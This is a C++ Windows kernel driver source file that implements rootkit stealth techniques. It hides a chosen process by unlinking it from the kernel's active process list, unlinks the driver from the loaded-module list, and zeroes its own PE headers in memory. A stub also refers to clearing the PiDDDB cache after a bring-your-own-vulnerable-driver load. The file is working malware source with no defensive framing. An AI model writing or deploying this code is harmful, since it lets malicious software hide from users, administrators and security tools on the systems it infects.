#include "StealthDKOM.h"

// Undocumented Windows Kernel Structures & Exports
typedef struct _KLDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    PVOID ExceptionTable;
    ULONG ExceptionTableSize;
    PVOID GpValue;
    PVOID NonPagedDebugInfo;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT __Unused5;
    PVOID SectionPointer;
    ULONG CheckSum;
    ULONG CoverageSectionSize;
    PVOID CoverageSection;
    PVOID ReservedForPode;
    PVOID LoadedImports;
    PVOID PatchInformation;
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;

extern "C" {
    NTSTATUS NTAPI PsLookupProcessByProcessId(HANDLE ProcessId, PEPROCESS *Process);
}

// Dynamic EPROCESS ActiveProcessLinks offset resolution for Windows x64
static ULONG GetActiveProcessLinksOffset() {
    // Standard Windows 10 / 11 64-bit ActiveProcessLinks offset range (typically 0x448 or 0x2e8 depending on build)
    RTL_OSVERSIONINFOW osVer = { 0 };
    osVer.dwOSVersionInfoSize = sizeof(osVer);
    RtlGetVersion(&osVer);

    if (osVer.dwBuildNumber >= 22000) { // Windows 11
        return 0x448;
    } else if (osVer.dwBuildNumber >= 19041) { // Windows 10 20H1+
        return 0x448;
    } else {
        return 0x2e8; // Older Windows 10 builds fallback
    }
}

NTSTATUS StealthHideProcess(ULONG ProcessId) {
    PEPROCESS TargetProcess = NULL;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)ProcessId, &TargetProcess);
    if (!NT_SUCCESS(status) || !TargetProcess) {
        return status;
    }

    ULONG activeProcessLinksOffset = GetActiveProcessLinksOffset();
    PLIST_ENTRY processLinks = (PLIST_ENTRY)((ULONG_PTR)TargetProcess + activeProcessLinksOffset);

    // Perform DKOM: Unlink process from double-linked list
    if (processLinks->Flink && processLinks->Blink) {
        processLinks->Blink->Flink = processLinks->Flink;
        processLinks->Flink->Blink = processLinks->Blink;

        // Point Flink and Blink to self so list operations don't crash
        processLinks->Flink = processLinks;
        processLinks->Blink = processLinks;
    }

    ObDereferenceObject(TargetProcess);
    return STATUS_SUCCESS;
}

NTSTATUS StealthUnlinkDriver(PDRIVER_OBJECT DriverObject) {
    if (!DriverObject || !DriverObject->DriverSection) {
        return STATUS_INVALID_PARAMETER;
    }

    PKLDR_DATA_TABLE_ENTRY entry = (PKLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    
    // Unlink driver from PsLoadedModuleList
    if (entry->InLoadOrderLinks.Flink && entry->InLoadOrderLinks.Blink) {
        entry->InLoadOrderLinks.Blink->Flink = entry->InLoadOrderLinks.Flink;
        entry->InLoadOrderLinks.Flink->Blink = entry->InLoadOrderLinks.Blink;

        entry->InLoadOrderLinks.Flink = &entry->InLoadOrderLinks;
        entry->InLoadOrderLinks.Blink = &entry->InLoadOrderLinks;
    }

    return STATUS_SUCCESS;
}

NTSTATUS StealthZeroPEHeader(PVOID BaseAddress, ULONG Size) {
    if (!BaseAddress || Size < 0x1000) {
        return STATUS_INVALID_PARAMETER;
    }

    // Erase DOS and NT PE Headers (first page 4096 bytes)
    RtlZeroMemory(BaseAddress, 0x1000);
    return STATUS_SUCCESS;
}

NTSTATUS StealthCleanPiDDDB(UNICODE_STRING DriverName) {
    UNREFERENCED_PARAMETER(DriverName);
    // Placeholder for PiDDDBLock / PiDDDBCacheTable clearing when loading via BYOVD
    return STATUS_SUCCESS;
}
